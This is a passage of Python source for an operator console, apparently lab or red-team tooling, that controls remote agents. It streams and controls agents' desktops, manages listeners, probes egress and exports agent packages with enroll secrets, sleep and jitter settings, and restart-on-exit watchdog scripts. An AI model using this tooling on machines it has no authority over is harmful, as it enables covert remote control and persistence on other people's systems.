            self._live_desktop_toggle(agent_id, False)
        except Exception:
            pass
        try:
            self._agents.stop_live_ui()
        except Exception:
            pass
        try:
            dv = getattr(self._agents, "_desktop_viewer", None)
            if dv is not None and hasattr(dv, "prepare_keepstream_connect"):
                dv.prepare_keepstream_connect()
        except Exception:
            pass
        # Optional operator plug-in + Session profile (Gaming / Balanced / Quality)
        start_opts = dict(options or {})
        if not start_opts and self._agents is not None:
            try:
                dv = getattr(self._agents, "_desktop_viewer", None)
                if dv is not None and hasattr(dv, "session_start_options"):
                    start_opts = dict(dv.session_start_options() or {})
            except Exception:
                start_opts = {}

        profile = "path"
        try:
            if start_opts.get("max_side") is not None:
                max_side = int(start_opts.get("max_side") or 1280)
            else:
                max_side = int(self._agents.shot_max_side())
            profile = str(start_opts.get("profile") or "path").lower()
            # LAN 60 can go higher; Path stays lean for SOCKS/TCP
            cap = 1600 if profile in ("lan60", "lan", "gaming", "gaming-lan") else 1440
            max_side = max(640, min(max_side, cap))
        except Exception:
            max_side = 1280
            profile = "path"
        # Stash for paint/input tuning while Session is up
        self._ks_profile = profile

        # Init GStreamer on the GTK main thread before any worker uses it.
        # Gst.init from the Keepstream thread freezes Control/Session UI.
        try:
            from hogwarts.h264dec import ensure_gst_init

            ensure_gst_init()
        except Exception:
            pass

        def work_start() -> None:
            err: str | None = None
            res: dict | None = None
            # Spike 2: when Reach path SOCKS is up, dial Session through it
            path_socks = self._socks_tuple()
            try:
                client = self._client()
                # Prefer reverse bind; operator can force loopback via viewer options
                face = str(start_opts.get("face") or "reverse").strip().lower()
                bind = str(start_opts.get("bind") or "").strip()
                if not bind:
                    bind = "127.0.0.1" if face in ("loopback", "path") else "0.0.0.0"
                # P7: prefer H.264 when desk can decode (GStreamer); else JPEG
                codec = str(start_opts.get("codec") or "").strip().lower()
                if not codec or codec == "auto":
                    try:
                        from hogwarts.h264dec import H264ToJpeg

                        codec = "h264" if H264ToJpeg().available else "jpeg"
                    except Exception:
                        codec = "jpeg"
                if codec not in ("jpeg", "h264", "auto"):
                    codec = "jpeg"
                # Keepstream Ultra: pass through UI profile (lan60|path). Do NOT
                # force "default" — that mapped server-side to path and skipped
                # lan60 capture pins (see notes/keepstream-ultra desk-fix-profile).
                profile = str(
                    start_opts.get("profile")
                    or getattr(self, "_ks_profile", None)
                    or "path"
                ).strip().lower()
                if profile in (
                    "lan",
                    "lan60",
                    "lan-60",
                    "gaming",
                    "gaming-lan",
                    "gaming_lan",
                    "ultra",
                    "lowlat",
                ):
                    profile = "lan60"
                elif profile in ("path", "balanced", "default", "c2", "socks", ""):
                    profile = "path"
                else:
                    profile = "path"
                # Profile-aware defaults when viewer omitted knobs
                if profile == "lan60":
                    def_fps, def_q, def_tr = 60.0, 80, "udp"
                else:
                    def_fps, def_q, def_tr = 45.0, 72, "tcp"
                try:
                    fps = float(
                        start_opts["fps"]
                        if start_opts.get("fps") is not None
                        else def_fps
                    )
                except (TypeError, ValueError):
                    fps = def_fps
                fps = max(30.0, min(fps, 60.0))
                # Default stream: MJPEG; codec from options or jpeg for LAN feel
                if start_opts.get("codec"):
                    c2 = str(start_opts.get("codec") or "").strip().lower()
                    if c2 in ("jpeg", "h264", "auto"):
                        codec = c2
                    else:
                        codec = "jpeg"
                else:
                    codec = "jpeg"
                try:
                    quality = int(
                        start_opts["quality"]
                        if start_opts.get("quality") is not None
                        else def_q
                    )
                except (TypeError, ValueError):
                    quality = def_q
                # lan60 capture pins use quality<=82 — clamp default path only
                if profile == "lan60":
                    quality = max(50, min(quality, 82))
                else:
                    quality = max(50, min(quality, 95))
                payload: dict = {
                    "mode": "keepstream",
                    "face": face if face != "path" else "loopback",
                    "bind": bind,
                    "port": 0,
                    "max_side": max_side,
                    "codec": codec,
                    "profile": profile,
                    "fps": max(30.0, min(fps, 60.0)),
                    "quality": quality,
                }
                # Local cursor (desk paints pointer)
                if "local_cursor" in start_opts:
                    payload["local_cursor"] = bool(start_opts.get("local_cursor"))
                else:
                    payload["local_cursor"] = True
                if "draw_mouse" in start_opts:
                    payload["draw_mouse"] = bool(start_opts.get("draw_mouse"))
                else:
                    payload["draw_mouse"] = False
                if "transport" in start_opts:
                    tr = str(start_opts.get("transport") or "").strip().lower()
                    if tr in ("tcp", "udp"):
                        payload["transport"] = tr
                    else:
                        payload["transport"] = def_tr
                else:
                    payload["transport"] = def_tr
                ip = start_opts.get("input_provider")
                if isinstance(ip, dict) and (
                    ip.get("command") or ip.get("pipe") or ip.get("kind")
                ):
                    payload["input_provider"] = ip
                created = client.create_task(
                    agent_id,
                    type_="session_start",
                    payload=payload,
                )
                tid = str(created.get("task_id") or created.get("id") or "")
                task = self._wait_task_result(client, tid, tries=90, max_wait=45.0)
                if not task or task.status != "succeeded":
                    st = task.status if task else "timeout"
                    raise RuntimeError(f"session_start → {st}")
                res = task.result or {}
                if res.get("error"):
                    raise RuntimeError(str(res.get("error")))
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    self._agents.set_desktop_note(err, ok=False)
                    self._log_msg(f"session_start fail: {err}")
                    return False
                assert res is not None
                host = str(
                    res.get("connect_host")
                    or res.get("host")
                    or ""
                ).strip()
                # Prefer agent internal_ip from roster when bind is all-interfaces
                if not host or host in ("0.0.0.0", "::"):
                    try:
                        for a in getattr(self._agents, "_agents", []) or []:
                            if getattr(a, "id", None) == agent_id:
                                host = (
                                    str(getattr(a, "internal_ip", "") or "")
                                    or str(getattr(a, "hostname", "") or "")
                                )
                                break
                    except Exception:
                        pass
                if not host:
                    host = "127.0.0.1"
                port = int(res.get("port") or 0)
                sid = str(res.get("session_id") or "")
                psk = str(res.get("psk") or "")
                if port <= 0 or not sid or not psk:
                    self._agents.set_desktop_note(
                        "session_start missing port/session/psk", ok=False
                    )
                    return False

                from hogwarts.keepstream import KeepstreamClient

                # Steady paint pump (~120 Hz try) — always pops *latest* frame.
                # More reliable for LAN 60 than idle_add (which starves under load).
                self._ks_paint_src = None
                self._ks_paint_n = 0

                def _ks_paint_tick() -> bool:
                    if not self._agents.desktop_viewer_open():
                        self._ks_paint_src = None
                        return False
                    ks_ref = getattr(self, "_keepstream", None)
                    if ks_ref is None or not getattr(ks_ref, "connected", False):
                        # Keep timer until disconnect handler clears it
                        return True
                    item = None
                    try:
                        item = ks_ref.pop_latest_frame()
                    except Exception:
                        item = None
                    if item is None:
                        return True  # no new frame; try again next tick
                    data, meta = item
                    n = int(getattr(self, "_ks_paint_n", 0) or 0) + 1
                    self._ks_paint_n = n
                    if n == 1 or n % 60 == 0:
                        rtt = meta.get("rtt_ms")
                        rtt_s = (
                            f" · rtt {rtt:.0f}ms"
                            if isinstance(rtt, (int, float))
                            else ""
                        )
                        drop = meta.get("dropped") or 0
                        drop_s = f" · drop {drop}" if drop else ""
                        cname = meta.get("codec_name") or (
                            "h264" if meta.get("codec") == 2 else "jpeg"
                        )
                        note = (
                            f"STREAM {meta.get('width')}×{meta.get('height')} · "
                            f"{cname} · #{meta.get('frame_id')} · "
                            f"{meta.get('bytes')} B"
                            f"{rtt_s}{drop_s}"
                        )
                    else:
                        note = "STREAM"
                    # Paint straight into the viewer — skip Agents status thrash
                    dv = getattr(self._agents, "_desktop_viewer", None)
                    if dv is not None:
                        try:
                            dv.apply_frame(
                                data,
                                note=note,
                                ok=True,
                                record_history=False,
                                pixel_format=str(meta.get("pixel_format") or "")
                                or None,
                                width=meta.get("width"),
                                height=meta.get("height"),
                            )
                            return True
                        except Exception:
                            pass
                    self._agents.set_desktop_frame(
                        data,
                        note=note,
                        ok=True,
                        record_history=False,
                        pixel_format=str(meta.get("pixel_format") or "") or None,
                        width=meta.get("width"),
                        height=meta.get("height"),
                    )
                    return True

                def on_frame(_data: bytes, _meta: dict) -> None:
                    # Ensure paint pump is running (idempotent)
                    if getattr(self, "_ks_paint_src", None) is not None:
                        return
                    # 8ms ≈ 125 Hz pull; still latest-frame-only (drops intermediates)
                    self._ks_paint_src = GLib.timeout_add(8, _ks_paint_tick)

                def on_status(msg: str, ok: bool | None) -> None:
                    def ui() -> bool:
                        self._agents.set_desktop_note(msg, ok=ok)
                        # HELLO_OK sets local_cursor — re-show OS pointer now
                        # (attach often runs before connect; host draw_mouse=0)
                        if ok is True or (
                            isinstance(msg, str)
                            and (
                                "Keepstream up" in msg
                                or "local cursor" in msg.lower()
                            )
                        ):
                            try:
                                dv = getattr(self._agents, "_desktop_viewer", None)
                                if dv is not None and hasattr(
                                    dv, "on_keepstream_up"
                                ):
                                    dv.on_keepstream_up()
                                elif dv is not None and hasattr(
                                    dv, "_apply_session_cursor"
                                ):
                                    dv._apply_session_cursor()
                            except Exception:
                                pass
                        return False

                    GLib.idle_add(ui)

                def on_closed() -> None:
                    def ui() -> bool:
                        src = getattr(self, "_ks_paint_src", None)
                        if src is not None:
                            try:
                                GLib.source_remove(src)
                            except Exception:
                                pass
                            self._ks_paint_src = None
                        self._agents.set_desktop_note(
                            "Keepstream disconnected", ok=None
                        )
                        return False

                    GLib.idle_add(ui)

                socks_h: str | None = None
                socks_p: int | None = None
                if path_socks:
                    socks_h, socks_p = path_socks
                # Direct LAN when no path SOCKS; else Spike 2 path dial
                force_direct = bool(start_opts.get("direct")) or face == "lan"
                if force_direct:
                    socks_h, socks_p = None, None
                ks = KeepstreamClient(
                    host=host,
                    port=port,
                    session_id=sid,
                    psk=psk,
                    on_frame=on_frame,
                    on_status=on_status,
                    on_closed=on_closed,
                    socks_host=socks_h,
                    socks_port=socks_p,
                )
                # Pre-seed before HELLO so desk never paints "none" over
                # a host that already omitted the cursor (gaming local_cursor).
                try:
                    if bool(res.get("local_cursor")) or str(
                        res.get("profile") or profile or ""
                    ).lower() in ("gaming", "gaming-lan"):
                        ks.local_cursor = True
                except Exception:
                    pass
                self._keepstream = ks
                # Viewer can send input over Keepstream
                try:
                    self._agents.attach_keepstream(ks)
                except Exception:
                    pass
                ks.start()
                via = "path SOCKS" if socks_h else "direct"
                capture = str(res.get("capture") or "").strip() or "?"
                agent_ver = str(res.get("agent_version") or "").strip()
                note = (
                    f"Keepstream {host}:{port} · {via} · {sid} · "
                    f"codec={res.get('codec')} · capture={capture}"
                )
                if agent_ver:
                    note += f" · agent {agent_ver}"
                self._agents.set_desktop_note(note, ok=True)
                info = dict(res or {})
                info["via"] = via
                info["capture"] = capture
                if agent_ver:
                    info["agent_version"] = agent_ver
                if socks_h:
                    info["socks"] = f"{socks_h}:{socks_p}"
                self._agents.set_desktop_session_info(info)
                self._log_msg(f"session_start {note}")
                self._refresh_tasks(agent_id)
                return False

            GLib.idle_add(done)

        threading.Thread(
            target=work_start, name="hogwarts-session-start", daemon=True
        ).start()
        self._agents.set_desktop_note("Starting stream…")

    def _refresh_tasks(self, agent_id: str) -> None:
        if not self._plane.is_configured or not agent_id:
            return

        def work() -> None:
            try:
                tasks = self._client().list_tasks(agent_id)
                err = None
            except Exception as exc:
                tasks = []
                err = str(exc)

            def done() -> bool:
                if self._agents.selected_agent_id() != agent_id:
                    return False
                if err:
                    self._agents.set_task_note(err, ok=False)
                else:
                    self._agents.set_tasks(tasks)
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-tasks", daemon=True).start()

    def _save_listener(self, quiet: bool = False) -> None:
        snap = self._listener.snapshot()
        snap["updated"] = datetime.now(timezone.utc).isoformat()
        data = self._store.load()
        data.update(snap)
        self._store.save(data)
        self._log_msg("Listener job saved")
        if not quiet and self._ctx.toast:
            self._ctx.toast("Listener job saved")

    def _copy_listener_line(self, *_a) -> None:
        line = self._listener.listener_line()
        self._clipboard_set(line)
        self._log_msg(f"Copied job: {line}")
        if self._ctx.toast:
            self._ctx.toast("Job line copied")

    def _listeners_pull(self) -> None:
        if not self._plane.is_configured:
            if self._ctx.toast:
                self._ctx.toast("Plane not configured")
            return

        def work() -> None:
            try:
                rows = self._client().list_listeners()
                err = None
            except Exception as exc:
                rows = []
                err = str(exc)

            def done() -> bool:
                if err:
                    self._listener.status.set_text(f"Pull failed: {err}")
                    self._log_msg(f"Listeners pull fail: {err}")
                else:
                    self._listener.replace_listeners(rows)
                    self._save_listener(quiet=True)
                    self._listener.status.set_text(f"Pulled {len(rows)} listener(s)")
                    self._log_msg(f"Listeners pulled ({len(rows)})")
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-lst-pull", daemon=True).start()

    def _listeners_push(self) -> None:
        if not self._plane.is_configured:
            if self._ctx.toast:
                self._ctx.toast("Plane not configured")
            return
        snap = self._listener.snapshot()
        rows = list(snap.get("listeners") or [])

        def work() -> None:
            ok_n = 0
            err = None
            try:
                client = self._client()
                for row in rows:
                    client.upsert_listener(row)
                    ok_n += 1
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    self._listener.status.set_text(f"Push failed after {ok_n}: {err}")
                    self._log_msg(f"Listeners push fail: {err}")
                else:
                    self._listener.status.set_text(f"Pushed {ok_n} listener(s)")
                    self._log_msg(f"Listeners pushed ({ok_n})")
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-lst-push", daemon=True).start()

    def _export_agent_zip(self) -> None:
        """Build lab agent package: agent.py + agent.json + enroll secret + README."""
        if not self._plane.is_configured:
            if self._ctx.toast:
                self._ctx.toast("Configure Plane first")
            return

        def work() -> None:
            err = None
            out_path: Path | None = None
            try:
                import shutil
                import zipfile

                client = self._client()
                stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
                label = f"export-{stamp}"
                minted = client.mint_enroll_secret(
                    max_uses=1, ttl_sec=7200, label=label
                )
                secret = str(minted.get("secret") or "")
                package_id = str(minted.get("package_id") or "").strip()
                enroll_id = str(minted.get("id") or "").strip()
                canary_label = str(minted.get("canary_label") or "").strip().lower()
                expires_at = str(minted.get("expires_at") or "")
                created = str(minted.get("created") or "")
                base = self._plane.base_url.rstrip("/")
                # Optional DNS canary base from Ops kit (persisted in hogwarts.json)
                try:
                    canary_domain = self._ops.get_canary_domain()
                except Exception:
                    canary_domain = ""
                if not canary_domain:
                    try:
                        canary_domain = str(
                            (self._store.load() or {}).get("canary_domain") or ""
                        ).strip()
                    except Exception:
                        canary_domain = ""
                canary_domain = canary_domain.lstrip(".").rstrip(".").lower()
                canary_url = (
                    f"{base}/api/v1/canary/{canary_label}" if canary_label else ""
                )
                canary_fqdn = (
                    f"{canary_label}.{canary_domain}"
                    if canary_label and canary_domain
                    else ""
                )
                # Locate agent.py next to plugin or repo
                plugin_dir = Path(getattr(self._ctx, "plugin_dir", "") or ".")
                # page.py lives at <root>/hogwarts/page.py → parents[1] is repo/plugin root
                candidates = [
                    plugin_dir / "agent" / "agent.py",
                    plugin_dir.parent / "agent" / "agent.py",
                    Path(__file__).resolve().parents[1] / "agent" / "agent.py",
                ]
                agent_src = next((p for p in candidates if p.is_file()), None)
                if agent_src is None:
                    raise FileNotFoundError("agent/agent.py not found near plugin")
                out_path = self._ctx.data_path(
                    f"agent-export-{package_id or stamp}.zip"
                )
                # Per-package identity (Sliver lesson: no shared lab password).
                # enroll_secret is one-shot; package_id survives on the agent record.
                # canary_label is public attribution (HTTP + optional DNS).
                agent_json = {
                    "base_url": base,
                    # Optional failovers: "base_urls": ["https://edge1", "https://edge2"],
                    "enroll_secret": secret,
                    "package_id": package_id,
                    "export_id": enroll_id,
                    "export_label": label,
                    "export_expires_at": expires_at,
                    "canary_label": canary_label,
                    "canary_url": canary_url,
                    "canary_fqdn": canary_fqdn,
                    "sleep": 5,
                    "jitter": 0.2,
                    "clear_enroll_secret": True,
                }
                manifest = {
                    "kind": "hogwarts-agent-package",
                    "version": 1,
                    "package_id": package_id,
                    "export_id": enroll_id,
                    "label": label,
                    "plane": base,
                    "canary_label": canary_label,
                    "canary_url": canary_url,
                    "canary_fqdn": canary_fqdn or None,
                    "max_uses": 1,
                    "created": created,
                    "expires_at": expires_at,
                    "note": (
                        "Unique package identity + canary. One enroll then secret is burned. "
                        "Do not reuse zips across hosts; mint a new export per agent. "
                        "First agent start fires the canary (HTTP; DNS if canary_fqdn set)."
                    ),
                }
                readme = f"""Hogwarts lab agent package
==========================
Plane:     {base}
Package:   {package_id or "(unknown)"}
Export id: {enroll_id or "(unknown)"}
Label:     {label}
Expires:   {expires_at or "n/a"}
Canary:    {canary_label or "(none)"}
Canary URL:{canary_url or "(none)"}
Canary DNS:{canary_fqdn or "(disabled — set Ops canary domain)"}

Identity (Sliver-class lesson):
  - This zip has a UNIQUE one-shot enroll secret and package_id.
  - Do not share the same zip across machines — mint a new export per agent.
  - After enroll, package_id is bound to the agent on the plane (audit/attribution).
  - Enroll secret is cleared from agent.json after first successful enroll.

Package canary (purple / stolen-export):
  - On first start the agent GETs canary_url (plane event channel=canary).
  - Optional DNS resolve of canary_fqdn if you operate that zone (sinkhole + logs).
  - canary_label is public identity, not a secret — do not treat it as enroll.

Do not commit this zip.

Stability (built into agent.py loop):
  - Never exits on network errors; exponential backoff (2s→120s) + jitter
  - Result spool: agent.spool.json next to agent.json if result POST fails
  - Multi-plane: set base_urls: ["https://edge", "https://backup"] or PLANE_URLS=a,b

Linux / macOS:
  python3 agent.py once -c agent.json
  python3 agent.py loop -c agent.json
  sh watchdog-linux.sh          # outer process keep-alive

Windows (Python 3.10+ on PATH):
  py agent.py once -c agent.json
  py agent.py loop -c agent.json
  watchdog-windows.bat

Optional one-file binary (PyInstaller on *same* OS — no Linux→PE cross):
  pip install pyinstaller
  pyinstaller --onefile --name hogwarts-agent agent.py
  # Windows: pwsh -File agent/windows/build-windows.ps1 (repo)
  # CI: GitHub Actions workflow windows-agent.yml

Keepstream 60fps (Stream): install ffmpeg on PATH
  Windows: winget install Gyan.FFmpeg   → gdigrab MJPEG
  Linux:   apt install ffmpeg           → x11grab MJPEG
  Without ffmpeg the agent uses slow PIL fallback.

Hogwarts Plane panel: URL={base}  token=<operator token>
"""
                run_sh = "#!/bin/sh\nexec python3 agent.py loop -c agent.json\n"
                run_bat = "@echo off\r\npy agent.py loop -c agent.json\r\n"
                watchdog_sh = (
                    "#!/bin/sh\n"
                    "# Outer watchdog: restart agent if the process exits (kill -9, OOM).\n"
                    "# Loop mode already reconnects on network blips; this covers process death.\n"
                    "cd \"$(dirname \"$0\")\" || exit 1\n"
                    "while true; do\n"
                    "  python3 agent.py loop -c agent.json\n"
                    "  ec=$?\n"
                    "  echo \"[watchdog] agent exited $ec — restart in 5s\" >&2\n"
                    "  sleep 5\n"
                    "done\n"
                )
                watchdog_bat = (
                    "@echo off\r\n"
                    "REM Outer watchdog — restart agent after process exit\r\n"
                    "cd /d \"%~dp0\"\r\n"
                    ":loop\r\n"
                    "py agent.py loop -c agent.json\r\n"
                    "echo [watchdog] agent exited %ERRORLEVEL% — restart in 5s\r\n"
                    "timeout /t 5 /nobreak >nul\r\n"
                    "goto loop\r\n"
                )
                build_win = (
                    "@echo off\r\n"
                    "REM Build hogwarts-agent.exe (PyInstaller — run on Windows, not Linux)\r\n"
                    "REM Prefer: pwsh -File agent\\windows\\build-windows.ps1 from full repo\r\n"
                    "py -m pip install pyinstaller\r\n"
                    "py -m PyInstaller --onefile --name hogwarts-agent agent.py\r\n"
                    "echo Built dist\\hogwarts-agent.exe\r\n"
                    "echo Keepstream 60fps needs ffmpeg on PATH (winget install Gyan.FFmpeg)\r\n"
                )
                build_sh = (
                    "#!/bin/sh\n"
                    "# Build one-file binary (needs: pip install pyinstaller)\n"
                    "python3 -m pip install --user pyinstaller\n"
                    "python3 -m PyInstaller --onefile --name hogwarts-agent agent.py\n"
                    "echo Built dist/hogwarts-agent\n"
                )
                with zipfile.ZipFile(out_path, "w", zipfile.ZIP_DEFLATED) as zf:
                    zf.write(agent_src, arcname="agent.py")
                    zf.writestr("agent.json", json.dumps(agent_json, indent=2) + "\n")
                    zf.writestr(
                        "MANIFEST.json", json.dumps(manifest, indent=2) + "\n"
                    )
                    zf.writestr("README.txt", readme)
                    zf.writestr("run-linux.sh", run_sh)
                    zf.writestr("run-windows.bat", run_bat)
                    zf.writestr("watchdog-linux.sh", watchdog_sh)
                    zf.writestr("watchdog-windows.bat", watchdog_bat)
                    zf.writestr("build-windows.bat", build_win)
                    zf.writestr("build-linux.sh", build_sh)
                    # Optional: freeze current-platform binary if PyInstaller present
                    try:
                        import PyInstaller  # noqa: F401
                        import subprocess as sp
                        import tempfile

                        with tempfile.TemporaryDirectory() as td:
                            td_p = Path(td)
                            sp.run(
                                [
                                    sys.executable,
                                    "-m",
                                    "PyInstaller",
                                    "--onefile",
                                    "--name",
                                    "hogwarts-agent",
                                    "--distpath",
                                    str(td_p / "dist"),
                                    "--workpath",
                                    str(td_p / "build"),
                                    "--specpath",
                                    str(td_p),
                                    str(agent_src),
                                ],
                                check=True,
                                capture_output=True,
                                timeout=300,
                            )
                            for built in (td_p / "dist").iterdir():
                                zf.write(
                                    built,
                                    arcname=f"bin/{built.name}",
                                )
                    except Exception:
                        pass
                # tighten perms on host
                try:
                    out_path.chmod(0o600)
                except OSError:
                    pass
                # Local ledger (no enroll secret — id + path + canary only)
                try:
                    meta = self._store.load()
                    # Persist canary domain for next export / restart
                    if canary_domain:
                        meta["canary_domain"] = canary_domain
                    ledger = list(meta.get("agent_exports") or [])
                    ledger.insert(
                        0,
                        {
                            "package_id": package_id,
                            "export_id": enroll_id,
                            "label": label,
                            "plane": base,
                            "canary_label": canary_label,
                            "canary_url": canary_url,
                            "canary_fqdn": canary_fqdn,
                            "path": str(out_path),
                            "created": created or stamp,
                            "expires_at": expires_at,
                            "max_uses": 1,
                        },
                    )
                    meta["agent_exports"] = ledger[:40]
                    self._store.save(meta)
                except Exception:
                    pass
                _ = shutil  # keep import used on some paths
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                if err:
                    self._ops.set_export_status(f"Export failed: {err}", ok=False)
                    self._log_msg(f"Agent export fail: {err}")
                else:
                    pkg = ""
                    try:
                        # recover package_id from path name if needed
                        if out_path is not None:
                            meta = self._store.load()
                            le = (meta.get("agent_exports") or [{}])[0]
                            pkg = str(le.get("package_id") or "")
                    except Exception:
                        pkg = ""
                    status = str(out_path)
                    if pkg:
                        status = f"{pkg} · one-shot · {out_path.name if out_path else ''}"
                    self._ops.set_export_status(status, ok=True)
                    self._ops.refresh_export_ledger(self._store.load())
                    self._log_msg(
                        f"Agent export package={pkg or '?'} → "
                        f"{out_path.name if out_path else '?'}"
                    )
                    if self._ctx.toast:
                        name = out_path.name if out_path else ""
                        self._ctx.toast(f"Agent package {pkg or name}")
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-agent-zip", daemon=True).start()
        self._ops.set_export_status("Minting unique package + building zip…")

    def _probe_listener(self, snap: dict[str, Any]) -> None:
        host = str(snap.get("accept_host") or "").strip()
        port_s = str(snap.get("accept_port") or "").strip()
        lid = str(snap.get("id") or "")
        if not host or not port_s:
            if self._ctx.toast:
                self._ctx.toast("Set accept host + port first")
            return
        try:
            port = int(port_s)
        except ValueError:
            if self._ctx.toast:
                self._ctx.toast("Invalid port")
            return

        def work() -> None:
            ok, ms, err = tcp_probe(host, port, timeout=3.0)
            detail = f"{host}:{port} {ms:.0f}ms" if ok else (err or "fail")

            def done() -> bool:
                self._listener.set_probe_result(lid, ok=ok, detail=detail)
                self._log_msg(f"Listener probe {detail} → {'ok' if ok else 'fail'}")
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-lst-probe", daemon=True).start()
        if self._ctx.toast:
            self._ctx.toast(f"Probing {host}:{port}…")

    def _targets(self) -> list[tuple[str, int, str]]:
        return [
            ("1.1.1.1", 443, "HTTPS · Cloudflare"),
            ("8.8.8.8", 443, "HTTPS · Google"),
            ("9.9.9.9", 853, "DoT · Quad9"),
            ("1.1.1.1", 53, "DNS TCP · CF"),
            ("cloudflare.com", 443, "HTTPS · SNI name"),
        ]

    def _socks_tuple(self) -> tuple[str, int] | None:
        try:
            st = self._ctx.services.core.status(force=True)
            proxy = (getattr(st, "local_proxy", None) or "").strip()
        except Exception:
            return None
        if not proxy:
            return None
        raw = proxy.split("://", 1)[-1].split("/")[0]
        if ":" not in raw:
            return None
        host, port_s = raw.rsplit(":", 1)
        try:
            return host, int(port_s)
        except ValueError:
            return None

    def _run_probes(self) -> None:
        if self._probe_busy:
            return
        self._probe_busy = True
        self._egress.set_busy(True, "Probing…")
        targets = self._targets()
        socks = self._socks_tuple()

        def work() -> None:
            rows: list[dict[str, Any]] = []
            err: str | None = None
            ts = datetime.now(timezone.utc).isoformat()
            try:
                for host, port, label in targets:
                    d_ok, d_ms, d_err = tcp_probe(host, port, timeout=3.0)
                    row: dict[str, Any] = {
                        "label": label,
                        "host": host,
                        "port": port,
                        "direct_ok": d_ok,
                        "direct_ms": round(d_ms, 1),
                        "direct_err": d_err,
                    }
                    if socks:
                        s_ok, s_ms, s_err = socks_tcp_probe(
                            socks[0], socks[1], host, port, timeout=8.0
                        )
                        row["path_ok"] = s_ok
                        row["path_ms"] = round(s_ms, 1)
                        row["path_err"] = s_err
                    rows.append(row)

                ts = datetime.now(timezone.utc).isoformat()
                try:
                    meta = self._store.load()
                    meta["last_probe_rows"] = rows
                    meta["last_probe_ts"] = ts
                    meta["last_probe_socks"] = (
                        f"{socks[0]}:{socks[1]}" if socks else None
                    )
                    self._store.save(meta)
                except Exception:
                    pass
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                self._probe_busy = False
                self._egress.set_busy(False)
                if err:
                    self._log_msg(f"Egress matrix failed: {err}")
                    if self._ctx.toast:
                        self._ctx.toast("Egress probe failed")
                else:
                    self._egress.render_rows(rows, ts=ts)
                    self._log_msg(f"Egress matrix complete ({len(rows)} targets)")
                    if self._ctx.toast:
                        self._ctx.toast("Egress matrix complete")
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-probe", daemon=True).start()

    def _probe_custom(self) -> None:
        host = self._egress.custom_host.get_text().strip()
        try:
            port = int(self._egress.custom_port.get_text().strip() or "443")
        except ValueError:
            if self._ctx.toast:
                self._ctx.toast("Invalid port")
            return
        if not host:
            if self._ctx.toast:
                self._ctx.toast("Enter a host")
            return
        if self._probe_busy:
            return
        self._probe_busy = True
        self._egress.set_busy(True, f"Probing {host}:{port}…")
        socks = self._socks_tuple()

        def work() -> None:
            rows: list[dict[str, Any]] = []
            ts = datetime.now(timezone.utc).isoformat()
            err: str | None = None
            try:
                d_ok, d_ms, d_err = tcp_probe(host, port, timeout=4.0)
                row: dict[str, Any] = {
                    "label": "Custom",
                    "host": host,
                    "port": port,
                    "direct_ok": d_ok,
                    "direct_ms": round(d_ms, 1),
                    "direct_err": d_err,
                }
                if socks:
                    s_ok, s_ms, s_err = socks_tcp_probe(
                        socks[0], socks[1], host, port, timeout=10.0
                    )
                    row["path_ok"] = s_ok
                    row["path_ms"] = round(s_ms, 1)
                    row["path_err"] = s_err
                rows = [row]
                meta = self._store.load()
                prev = meta.get("last_probe_rows")
                if isinstance(prev, list):
                    rows = [row] + [
                        r
                        for r in prev
                        if not (r.get("host") == host and r.get("port") == port)
                    ][:12]
                ts = datetime.now(timezone.utc).isoformat()
                meta["last_probe_rows"] = rows
                meta["last_probe_ts"] = ts
                self._store.save(meta)
            except Exception as exc:
                err = str(exc)

            def done() -> bool:
                self._probe_busy = False
                self._egress.set_busy(False)
                if err:
                    self._log_msg(f"Custom probe failed: {err}")
                else:
                    self._egress.render_rows(rows, ts=ts)
                    self._log_msg(f"Custom probe {host}:{port}")
                return False

            GLib.idle_add(done)

        threading.Thread(target=work, name="hogwarts-custom", daemon=True).start()

    def _clipboard_set(self, text: str) -> None:
        try:
            display = Gdk.Display.get_default()
            if display is not None:
                display.get_clipboard().set(text)
        except Exception:
            pass

    def _copy_socks(self, *_a) -> None:
        try:
            st = self._ctx.services.core.status(force=True)
            proxy = (getattr(st, "local_proxy", None) or "").strip()
        except Exception:
            proxy = ""
        if not proxy:
            if self._ctx.toast:
                self._ctx.toast("No SOCKS — connect a path first")
            return
        if not proxy.startswith("socks"):
            proxy = f"socks5://{proxy}"
        self._clipboard_set(proxy)
        self._log_msg(f"Copied SOCKS {proxy}")
        if self._ctx.toast:
            self._ctx.toast("SOCKS copied")

    def _open_export(self, *_a) -> None:
        try:
            from app_config import user_data_dir

            path = Path(user_data_dir()) / "reverse"
        except Exception:
            path = Path.home() / ".local" / "share" / "reach" / "reverse"
        path.mkdir(parents=True, exist_ok=True)
        self._xdg_open(path)
        self._log_msg(f"Opened export {path}")

    def _open_data(self, *_a) -> None:
        p = self._ctx.data_path()
        p.mkdir(parents=True, exist_ok=True)
        self._xdg_open(p)

    def _xdg_open(self, path: Path) -> None:
        try:
            subprocess.Popen(
                ["xdg-open", str(path)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
            if self._ctx.toast:
                self._ctx.toast(f"Opened {path.name}")
        except OSError as exc:
            if self._ctx.toast:
                self._ctx.toast(str(exc))

    def _go_marketplace(self) -> None:
        if self._ctx.navigate:
            self._ctx.navigate("marketplace")

    def _save_playbook_fields(self) -> None:
        # Also persist Ops canary domain with playbook save
        try:
            domain = self._ops.get_canary_domain()
            data = self._store.load()
            data["canary_domain"] = domain
            self._store.save(data)
        except Exception:
            pass
        fields = self._ops.snapshot_playbook()
        # Never persist anything that looks like a bearer token
        for k, v in list(fields.items()):
            if isinstance(v, str) and (
                "bearer " in v.lower() or (len(v) > 40 and " " not in v and k.endswith("token"))
            ):
                fields[k] = ""
        data = self._store.load()
        data["playbook"] = fields
        self._store.save(data)
        self._ops.set_save_status("Playbook fields saved (local, no secrets)", ok=True)
        self._log_msg("Playbook fields saved")
        if self._ctx.toast:
            self._ctx.toast("Playbook fields saved")

    def _export_playbook(self, *_a) -> None:
